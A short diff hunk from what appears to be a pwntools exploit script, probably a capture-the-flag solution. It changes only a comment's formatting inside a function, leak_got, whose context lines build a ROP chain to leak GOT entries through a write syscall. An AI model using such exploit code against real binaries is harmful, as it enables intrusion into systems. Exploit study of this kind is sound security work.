@@ -32,7 +32,7 @@ def leak_got(entry):
         rop += p64(elf.got[entry])
         rop += p64(0)
 
-        # Setting the length of the write is not necessary because we keep the
+        # Setting the length of the `write` is not necessary because we keep the
         # length set for the read function.
 
         # Then we return to the `syscall` instruction
